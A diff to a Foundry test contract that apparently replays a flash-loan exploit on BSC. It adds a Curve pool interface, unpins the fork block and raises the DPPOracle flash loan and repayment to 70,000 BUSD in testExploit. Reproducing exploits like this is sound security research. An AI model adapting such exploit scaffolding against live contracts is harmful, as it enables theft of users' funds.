@@ -46,6 +46,33 @@ interface IDPPOracle {
     ) external;
 }
 
+interface ICurvePool {
+    // Function to exchange one type of token for another
+    function exchange(
+        uint256 i,
+        uint256 j,
+        uint256 dx,
+        uint256 min_dy,
+        bool use_eth
+    ) external payable returns (uint256);
+
+    // Function to add liquidity to the pool
+    function add_liquidity(
+        uint256[2] memory amounts,
+        uint256 min_mint_amount,
+        bool use_eth
+    ) external payable returns (uint256);
+
+    // Function to remove liquidity from the pool
+    function remove_liquidity(uint256 token_amount, uint256[2] memory min_amounts, bool use_eth) external;
+
+    // Function to remove liquidity for a single coin from the pool
+    function remove_liquidity_one_coin(uint256 token_amount, uint256 i, uint256 min_amount, bool use_eth) external;
+
+    // Other functions specific to the CurvePool contract can be added here.
+}
+
+
 interface CheatCodes {
   // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork
   function createSelectFork(string calldata,uint256) external returns(uint256);
@@ -65,7 +92,7 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 29010220);
+        cheats.createSelectFork("bsc");
     }
 
     function testExploit() public {
@@ -76,7 +103,7 @@ contract ContractTest is Test {
             BUSD.decimals()
         );
 
-        DPPOracle.flashLoan(0, 30_000 * 1e18, address(this), new bytes(1));
+        DPPOracle.flashLoan(0, 70_000 * 1e18, address(this), new bytes(1));
 
     }
 
@@ -91,6 +118,8 @@ contract ContractTest is Test {
             BUSD.balanceOf(address(this)),
             BUSD.decimals()
         );
-        BUSD.transfer(address(DPPOracle), 30_000 * 1e18);
+
+
+        BUSD.transfer(address(DPPOracle), 70_000 * 1e18);
     }
 }
